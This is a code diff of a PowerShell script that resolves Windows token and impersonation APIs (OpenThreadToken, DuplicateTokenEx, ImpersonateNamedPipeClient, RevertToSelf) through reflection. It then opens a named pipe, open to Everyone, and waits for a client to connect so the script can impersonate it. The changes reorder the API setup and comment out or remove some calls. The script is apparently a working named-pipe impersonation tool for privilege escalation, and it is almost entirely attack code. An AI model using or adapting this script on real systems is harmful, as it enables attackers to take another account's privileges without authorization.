@@ -138,9 +138,6 @@ function Local:Get-DelegateType
   #API's
 
   
-  $OpenThreadAddr = Get-ProcAddress kernel32.dll OpenThread
-  $OpenThreadDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
-  $OpenThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadAddr, $OpenThreadDelegate)
     
   $OpenThreadTokenAddr = Get-ProcAddress advapi32.dll OpenThreadToken
   $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
@@ -158,9 +155,17 @@ function Local:Get-DelegateType
   $memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
   $memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
 	
-  $DuplicateTokenExAddr = Get-ProcAddress advapi32.dll DuplicateTokenEx
-  $DuplicateTokenExDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [UInt32], [UInt32], [IntPtr].MakeByRefType()) ([Bool])
-  $DuplicateTokenEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DuplicateTokenExAddr, $DuplicateTokenExDelegate)
+  #$DuplicateTokenExAddr = Get-ProcAddress advapi32.dll DuplicateTokenEx
+  #$DuplicateTokenExDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [UInt32], [UInt32], [IntPtr].MakeByRefType()) ([Bool])
+  #$DuplicateTokenEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DuplicateTokenExAddr, $DuplicateTokenExDelegate)
+  
+  $ImpersonateNamedPipeClientAddr = Get-ProcAddress Advapi32.dll ImpersonateNamedPipeClient
+  $ImpersonateNamedPipeClientDelegate = Get-DelegateType @( [Int] ) ([Int])
+  $ImpersonateNamedPipeClient = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateNamedPipeClientAddr, $ImpersonateNamedPipeClientDelegate)	
+  
+  $RevertToSelfAddr = Get-ProcAddress advapi32.dll RevertToSelf
+  $RevertToSelfDelegate = Get-DelegateType @() ([Bool])
+  $RevertToSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($RevertToSelfAddr, $RevertToSelfDelegate)
 
 ##############################  main ##########################################
 $pipename="dummypipe"
@@ -169,12 +174,6 @@ $AccessRule = New-Object System.IO.Pipes.PipeAccessRule( "Everyone", "ReadWrite"
 $PipeSecurity.AddAccessRule($AccessRule)
 $pipe = New-Object System.IO.Pipes.NamedPipeServerStream($pipename,"InOut",100, "Byte", "None", 1024, 1024, $PipeSecurity)
 $PipeHandle = $pipe.SafePipeHandle.DangerousGetHandle()
-$ImpersonateNamedPipeClientAddr = Get-ProcAddress Advapi32.dll ImpersonateNamedPipeClient
-$ImpersonateNamedPipeClientDelegate = Get-DelegateType @( [Int] ) ([Int])
-$ImpersonateNamedPipeClient = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateNamedPipeClientAddr, $ImpersonateNamedPipeClientDelegate)	
-$RevertToSelfAddr = Get-ProcAddress advapi32.dll RevertToSelf
-$RevertToSelfDelegate = Get-DelegateType @() ([Bool])
-$RevertToSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($RevertToSelfAddr, $RevertToSelfDelegate)
 echo "Waiting for connection on namedpipe:$pipename"
 $pipe.WaitForConnection()
 $pipeReader = new-object System.IO.StreamReader($pipe)
